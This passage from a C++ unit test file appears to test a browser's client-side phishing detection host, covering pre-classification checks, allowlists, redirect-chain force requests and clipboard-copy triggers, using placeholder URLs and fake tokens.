  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kTrue);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(nullptr);
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationCheckHttpsUrl) {
  GURL url("https://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(&url);
}

TEST_F(ClientSideDetectionHostTest,
       TestPreClassificationCheckNoneHttpOrHttpsUrl) {
  GURL url("file://host.com/");
  ExpectPreClassificationChecks(url, &kFalse, nullptr, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(nullptr);
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationCheckValidCached) {
  // If result is cached, we will try and display the blocking page directly
  // with no start classification message.
  GURL url("http://host8.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kTrue, &kFalse);

  UnsafeResource resource;
  EXPECT_CALL(*ui_manager_.get(), DisplayBlockingPage(_))
      .WillOnce(SaveArg<0>(&resource));

  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();
  EXPECT_EQ(url, resource.url);
  EXPECT_EQ(url, resource.original_url);

  fake_phishing_detector_.CheckMessage(nullptr);
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationAllowlistedByPolicy) {
  // Configures enterprise allowlist.
  ScopedListPrefUpdate update(profile()->GetPrefs(),
                              prefs::kSafeBrowsingAllowlistDomains);
  update->Append("example.com");

  GURL url("http://example.com/");
  ExpectPreClassificationChecks(url, &kFalse, nullptr, nullptr, nullptr);

  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(nullptr);
}

TEST_F(ClientSideDetectionHostTest, RecordsPhishingDetectorResults) {
  {
    ClientPhishingRequest verdict;
    verdict.set_url("http://not-phishing.com/");
    verdict.set_client_score(0.1f);
    verdict.set_is_phishing(false);

    base::HistogramTester histogram_tester;

    EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
        .Times(0);
    PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
    EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

    histogram_tester.ExpectUniqueSample(
        "SBClientPhishing.PhishingDetectorResult.TriggerModel",
        mojom::PhishingDetectorResult::SUCCESS, 1);
  }

  {
    base::HistogramTester histogram_tester;

    EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
        .Times(0);
    PhishingDetectionError(mojom::PhishingDetectorResult::CLASSIFIER_NOT_READY);
    EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

    histogram_tester.ExpectUniqueSample(
        "SBClientPhishing.PhishingDetectorResult.TriggerModel",
        mojom::PhishingDetectorResult::CLASSIFIER_NOT_READY, 1);
  }

  {
    base::HistogramTester histogram_tester;

    EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
        .Times(0);
    PhishingDetectionError(
        mojom::PhishingDetectorResult::FORWARD_BACK_TRANSITION);
    EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

    histogram_tester.ExpectUniqueSample(
        "SBClientPhishing.PhishingDetectorResult.TriggerModel",
        mojom::PhishingDetectorResult::FORWARD_BACK_TRANSITION, 1);
  }
}

TEST_F(ClientSideDetectionHostTest, RecordsPhishingDetectionDuration) {
  base::HistogramTester histogram_tester;
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectionDuration.TriggerModel", 0);

  GURL start_url("http://safe.example.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(start_url, false);
  ExpectPreClassificationChecks(start_url, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(start_url);
  WaitAndCheckPreClassificationChecks();
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectionDuration.TriggerModel", 1);

  GURL url("http://phishing.example.com/");
  ClientPhishingRequest verdict;
  verdict.set_url(url.spec());
  verdict.set_client_score(0.1f);
  verdict.set_is_phishing(false);

  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();
  const base::TimeDelta duration = base::Milliseconds(10);
  AdvanceTimeTickClock(duration);

  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectionDuration.TriggerModel", 3);
  EXPECT_LE(duration.InMilliseconds(),
            histogram_tester
                .GetAllSamples(
                    "SBClientPhishing.PhishingDetectionDuration.TriggerModel")
                .front()
                .min);
}

TEST_F(ClientSideDetectionHostTest, PopulatesPageLoadToken) {
  GURL url("http://phishing.example.com/");
  ClientPhishingRequest verdict;
  verdict.set_client_score(1.0);
  verdict.set_is_phishing(true);

  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  std::unique_ptr<ClientPhishingRequest> verdict_sent;
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .WillOnce(MoveArg<0>(&verdict_sent));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
  ASSERT_EQ(1, verdict_sent->population().page_load_tokens_size());
}

TEST_F(ClientSideDetectionHostTest,
       CSDFeaturesCacheContainsVerdictAndFullDebuggingMetadata) {
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  ClientPhishingRequest* verdict_from_cache = nullptr;
  LoginReputationClientRequest::DebuggingMetadata* debugging_metadata = nullptr;

  GURL example_url("http://phishingurl.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url, false);
  ExpectPreClassificationChecks(
      /*url=*/example_url, /*is_private=*/&kFalse,
      /*match_csd_allowlist=*/&kFalse, /*get_valid_cached_result=*/&kFalse,
      /*over_phishing_report_limit=*/&kFalse);
  NavigateAndCommit(example_url);
  WaitAndCheckPreClassificationChecks();

  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;
  ClientPhishingRequest verdict;
  verdict.set_url(example_url.spec());
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _,
                                 "fake_access_token_for_debug_cache"))
      .WillOnce(MoveArg<1>(&cb));

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback token_cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .Times(1)
      .WillRepeatedly(MoveArg<0>(&token_cb));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  // Wait for token fetcher to be called.
  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(token_cb.is_null());
  std::move(token_cb).Run("fake_access_token_for_debug_cache");

  // Token is now fetched, so we will now callback on
  // ClientReportPhishingRequest.
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run(example_url, false, net::HTTP_OK, std::nullopt);

  ClientSideDetectionFeatureCache* feature_cache_map =
      ClientSideDetectionFeatureCache::FromWebContents(web_contents());
  verdict_from_cache = feature_cache_map->GetVerdictForURL(example_url);
  debugging_metadata =
      feature_cache_map->GetDebuggingMetadataForURL(example_url);

  // Model version and force request field are not checked because the model
  // isn't deployed, and the verdict cache manager is not populated.
  EXPECT_NE(debugging_metadata, nullptr);
  EXPECT_EQ(debugging_metadata->preclassification_check_result(),
            PreClassificationCheckResult::CLASSIFY);
  EXPECT_EQ(debugging_metadata->network_result(), net::HTTP_OK);
  EXPECT_EQ(debugging_metadata->phishing_detector_result(),
            PhishingDetectorResult::CLASSIFICATION_SUCCESS);
  EXPECT_EQ(debugging_metadata->local_model_detects_phishing(),
            verdict_from_cache->is_phishing());

  EXPECT_NE(verdict_from_cache, nullptr);
  EXPECT_EQ(verdict_from_cache->is_phishing(), verdict.is_phishing());
  EXPECT_EQ(verdict_from_cache->client_score(), verdict.client_score());
}

TEST_F(ClientSideDetectionHostTest,
       RTLookupResponseForceRequestSendsCSPPPingWhenVerdictNotPhishing) {
  base::HistogramTester histogram_tester;

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  SetFeatures({}, {});
  GURL example_url("http://suspiciousurl.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url, false);
  ExpectPreClassificationChecks(
      /*url=*/example_url, /*is_private=*/&kFalse,
      /*match_csd_allowlist=*/&kFalse, /*get_valid_cached_result=*/&kFalse,
      /*over_phishing_report_limit=*/&kFalse);
  NavigateAndCommit(example_url);
  WaitAndCheckPreClassificationChecks();

  VerdictCacheManager* cache_manager =
      VerdictCacheManagerFactory::GetForProfile(
          Profile::FromBrowserContext(web_contents()->GetBrowserContext()));

  RTLookupResponse response;

  RTLookupResponse::ThreatInfo* new_threat_info2 = response.add_threat_info();
  new_threat_info2->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
  new_threat_info2->set_threat_type(
      RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
  new_threat_info2->set_cache_duration_sec(60);
  new_threat_info2->set_cache_expression_using_match_type("suspiciousurl.com/");
  new_threat_info2->set_cache_expression_match_type(
      RTLookupResponse::ThreatInfo::EXACT_MATCH);

  response.set_client_side_detection_type(
      safe_browsing::ClientSideDetectionType::FORCE_REQUEST);
  cache_manager->CacheRealTimeUrlVerdict(response, base::Time::Now());
  EXPECT_EQ(
      static_cast<int>(safe_browsing::ClientSideDetectionType::FORCE_REQUEST),
      cache_manager->GetCachedRealTimeUrlClientSideDetectionType(example_url));

  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;

  // The verdict's is_phishing is false, but we will still send a ping!
  ClientPhishingRequest verdict;
  verdict.set_url(example_url.spec());
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(false);
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _,
                                 "fake_access_token_for_force_request"))
      .WillOnce(MoveArg<1>(&cb));

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback token_cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .Times(1)
      .WillRepeatedly(MoveArg<0>(&token_cb));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  // Wait for token fetcher to be called.
  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(token_cb.is_null());
  std::move(token_cb).Run("fake_access_token_for_force_request");

  // Token is now fetched, so we will now callback on
  // ClientReportPhishingRequest.
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run(example_url, false, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                     true, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.RTLookupForceRequest.HasLlamaForcedTriggerInfo", false,
      1);
}

TEST_F(ClientSideDetectionHostTest,
       RTLookupResponseOnFirstURLInRedirectChainTriggersForceRequest) {
  base::HistogramTester histogram_tester;

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL first_url_redirect("http://firsturlsuspicious.com/");
  GURL second_url_redirect("http://secondurlnotsuspicious.com/");
  GURL third_url_redirect("http://thirdurlnotsuspicious.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(first_url_redirect, false);
  database_manager_->SetAllowlistLookupDetailsForUrl(second_url_redirect,
                                                     false);
  database_manager_->SetAllowlistLookupDetailsForUrl(third_url_redirect, false);

  auto navigation = content::NavigationSimulator::CreateBrowserInitiated(
      first_url_redirect, web_contents());
  navigation->Start();
  navigation->Redirect(second_url_redirect);
  navigation->Redirect(third_url_redirect);
  navigation->Commit();

  content::NavigationEntry* entry =
      web_contents()->GetController().GetVisibleEntry();

  ASSERT_TRUE(entry);
  EXPECT_EQ(entry->GetRedirectChain().size(), 3u);

  VerdictCacheManager* cache_manager =
      VerdictCacheManagerFactory::GetForProfile(
          Profile::FromBrowserContext(web_contents()->GetBrowserContext()));

  // We will only create a RTLookupResponse for the first URL and cache it in
  // the cache_manager.
  RTLookupResponse response;

  RTLookupResponse::ThreatInfo* new_threat_info2 = response.add_threat_info();
  new_threat_info2->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
  new_threat_info2->set_threat_type(
      RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
  new_threat_info2->set_cache_duration_sec(60);
  new_threat_info2->set_cache_expression_using_match_type(
      "firsturlsuspicious.com/");
  new_threat_info2->set_cache_expression_match_type(
      RTLookupResponse::ThreatInfo::EXACT_MATCH);

  response.set_client_side_detection_type(
      safe_browsing::ClientSideDetectionType::FORCE_REQUEST);
  cache_manager->CacheRealTimeUrlVerdict(response, base::Time::Now());
  EXPECT_EQ(
      static_cast<int>(safe_browsing::ClientSideDetectionType::FORCE_REQUEST),
      cache_manager->GetCachedRealTimeUrlClientSideDetectionType(
          first_url_redirect));

  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;

  // The verdict's is_phishing is false, but we will still send a ping! We are
  // using the third URL for the verdict because it's the last in the referrer
  // chain, but the first is in the cache, so it should still send a ping.
  ClientPhishingRequest verdict;
  verdict.set_url(third_url_redirect.spec());
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(false);
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _,
                                 "fake_access_token_for_force_request"))
      .WillOnce(MoveArg<1>(&cb));

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback token_cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .Times(1)
      .WillRepeatedly(MoveArg<0>(&token_cb));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  // Wait for token fetcher to be called.
  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(token_cb.is_null());
  std::move(token_cb).Run("fake_access_token_for_force_request");

  // Token is now fetched, so we will now callback on
  // ClientReportPhishingRequest.
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run(third_url_redirect, false, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                     true, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.RedirectChainContainsForceRequest", true, 1);
}

TEST_F(ClientSideDetectionHostTest,
       NoRTLookupResponseInRedirectChainContainsForceRequest) {
  base::HistogramTester histogram_tester;

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL first_url_redirect("http://firsturlnotsuspicious.com/");
  GURL second_url_redirect("http://secondurlnotsuspicious.com/");
  GURL third_url_redirect("http://thirdurlnotsuspicious.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(first_url_redirect, false);
  database_manager_->SetAllowlistLookupDetailsForUrl(second_url_redirect,
                                                     false);
  database_manager_->SetAllowlistLookupDetailsForUrl(third_url_redirect, false);

  auto navigation = content::NavigationSimulator::CreateBrowserInitiated(
      first_url_redirect, web_contents());
  navigation->Start();
  navigation->Redirect(second_url_redirect);
  navigation->Redirect(third_url_redirect);
  navigation->Commit();

  content::NavigationEntry* entry =
      web_contents()->GetController().GetVisibleEntry();

  ASSERT_TRUE(entry);
  EXPECT_EQ(entry->GetRedirectChain().size(), 3u);

  // The verdict's is_phishing is false, and there are no force requests at all
  // in the current URL and its redirect chain, so no ping will be sent.
  ClientPhishingRequest verdict;
  verdict.set_url(third_url_redirect.spec());
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(false);

  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 0);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::TRIGGER_MODELS, 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                     false, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.RedirectChainContainsForceRequest", false, 1);
}

TEST_F(ClientSideDetectionHostTest,
       RedirectChainKillswitchDoesNotTriggersForceRequest) {
  SetFeatures({kClientSideDetectionRedirectChainKillswitch}, {});

  base::HistogramTester histogram_tester;

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL first_url_redirect("http://firsturlsuspicious.com/");
  GURL second_url_redirect("http://secondurlnotsuspicious.com/");
  GURL third_url_redirect("http://thirdurlnotsuspicious.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(first_url_redirect, false);
  database_manager_->SetAllowlistLookupDetailsForUrl(second_url_redirect,
                                                     false);
  database_manager_->SetAllowlistLookupDetailsForUrl(third_url_redirect, false);

  auto navigation = content::NavigationSimulator::CreateBrowserInitiated(
      first_url_redirect, web_contents());
  navigation->Start();
  navigation->Redirect(second_url_redirect);
  navigation->Redirect(third_url_redirect);
  navigation->Commit();

  content::NavigationEntry* entry =
      web_contents()->GetController().GetVisibleEntry();

  ASSERT_TRUE(entry);
  EXPECT_EQ(entry->GetRedirectChain().size(), 3u);

  VerdictCacheManager* cache_manager =
      VerdictCacheManagerFactory::GetForProfile(
          Profile::FromBrowserContext(web_contents()->GetBrowserContext()));

  // We will only create a RTLookupResponse for the first URL and cache it in
  // the cache_manager.
  RTLookupResponse response;

  RTLookupResponse::ThreatInfo* new_threat_info2 = response.add_threat_info();
  new_threat_info2->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
  new_threat_info2->set_threat_type(
      RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
  new_threat_info2->set_cache_duration_sec(60);
  new_threat_info2->set_cache_expression_using_match_type(
      "firsturlsuspicious.com/");
  new_threat_info2->set_cache_expression_match_type(
      RTLookupResponse::ThreatInfo::EXACT_MATCH);

  response.set_client_side_detection_type(
      safe_browsing::ClientSideDetectionType::FORCE_REQUEST);
  cache_manager->CacheRealTimeUrlVerdict(response, base::Time::Now());
  EXPECT_EQ(
      static_cast<int>(safe_browsing::ClientSideDetectionType::FORCE_REQUEST),
      cache_manager->GetCachedRealTimeUrlClientSideDetectionType(
          first_url_redirect));

  // The verdict's is_phishing is false, but we will still send a ping! We are
  // using the third URL for the verdict because it's the last in the referrer
  // chain, but the first is in the cache, so it should still send a ping.
  ClientPhishingRequest verdict;
  verdict.set_url(third_url_redirect.spec());
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(false);
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  // Token is now fetched, so we will now callback on
  // ClientReportPhishingRequest.
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::TRIGGER_MODELS, 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                     false, 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.RedirectChainContainsForceRequest", 0);
}

TEST_F(ClientSideDetectionHostTest,
       TwoKeyboardLockRequestsOnSamePageOnlyLogsOnePreclassificationCheck) {
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  base::HistogramTester histogram_tester;

  GURL url("http://host3.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, true);

  // Keyboard lock request incoming, which triggers preclassification checks.
  ExpectPreClassificationChecks(
      /*url=*/url, /*is_private=*/&kFalse,
      /*match_csd_allowlist=*/nullptr, /*get_valid_cached_result=*/nullptr,
      /*over_phishing_report_limit=*/nullptr);

  csd_host_->KeyboardLockRequested();
  WaitAndCheckPreClassificationChecks();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.KeyboardLockRequested", 1);

  // We trigger keyboard lock again, but because we're still on the same page,
  // we do not trigger preclassification again.
  csd_host_->KeyboardLockRequested();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.KeyboardLockRequested", 1);
}

TEST_F(ClientSideDetectionHostTest,
       ClipboardCopyApiCallDoesNotProceedWithClassification) {
  SetFeatures({}, {kClientSideDetectionClipboardCopyApi});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  // Check that the clipboard histograms haven't been recorded yet.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  csd_host_->OnTextCopiedToClipboard(main_rfh(), u"test");
  WaitAndCheckPreClassificationChecks();

  // The feature to send CSP pings is disabled, so nothing will be classified
  // (or included in the HC allowlist).
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnClipboardCopyApi", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ClipboardCopyApi", 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi",
      PreClassificationCheckResult::NO_CLASSIFY_ALLOWLIST_METRIC, 1);
}

TEST_F(ClientSideDetectionHostTest,
       ClipboardCopyApiCallProceedsWithClassification) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi,
      {{kCsdClipboardCopyApiSampleRate.name, "1.0"}});

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  // Check that the clipboard histograms haven't been recorded yet.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  csd_host_->OnTextCopiedToClipboard(main_rfh(), u"test");
  WaitAndCheckPreClassificationChecks();

  // The feature to send CSP pings is enabled and the host is not included in
  // the HC allowlist, so normal classification will occur.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnClipboardCopyApi", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ClipboardCopyApi", 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi",
      PreClassificationCheckResult::CLASSIFY, 1);
}

TEST_F(
    ClientSideDetectionHostTest,
    ClipboardCopyApiCallDoesNotProceedWithClassificationWithHighHCAcceptanceRate) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi,
      {{kCsdClipboardCopyApiHCAcceptanceRate.name, "1.0"},
       {kCsdClipboardCopyApiSampleRate.name, "1.0"}});

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  // Check that the clipboard histograms haven't been recorded yet.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  csd_host_->OnTextCopiedToClipboard(main_rfh(), u"test");
  WaitAndCheckPreClassificationChecks();

  // The feature to send CSP pings is enabled, but the host is included in the
  // HC allowlist, so classification will not occur.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnClipboardCopyApi", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ClipboardCopyApi", 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi",
      PreClassificationCheckResult::NO_CLASSIFY_MATCH_HC_ALLOWLIST, 1);
}

TEST_F(ClientSideDetectionHostTest,
       ClipboardCopyApiCallDoesNotProceedWithClassificationWithZeroSampleRate) {
  SetFeatures({kClientSideDetectionClipboardCopyApi}, {});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  // Check that the clipboard histograms haven't been recorded yet.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  csd_host_->OnTextCopiedToClipboard(main_rfh(), u"test");
  WaitAndCheckPreClassificationChecks();

  // The feature to send CSP pings is enabled, but the sampling rate is set to
  // zero, so classification will not occur.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnClipboardCopyApi", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ClipboardCopyApi", 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi",
      PreClassificationCheckResult::NO_CLASSIFY_ALLOWLIST_METRIC, 1);
}

TEST_F(
    ClientSideDetectionHostTest,
    ClipboardCopyApiCallDoesNotProceedWithClassificationWithSuspiciousTokenFilter) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi,
      {{kCsdClipboardCopyApiSampleRate.name, "1.0"},
       {kCSDClipboardCopyApiSuspiciousTokenFilter.name, "true"}});

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  csd_host_->OnTextCopiedToClipboard(main_rfh(), u"normal text");

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);
}

TEST_F(
    ClientSideDetectionHostTest,
    ClipboardCopyApiCallProceedsWithClassificationWithSuspiciousTokenFilterAndMatch) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi,
      {{kCsdClipboardCopyApiSampleRate.name, "1.0"},
       {kCSDClipboardCopyApiSuspiciousTokenFilter.name, "true"}});

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
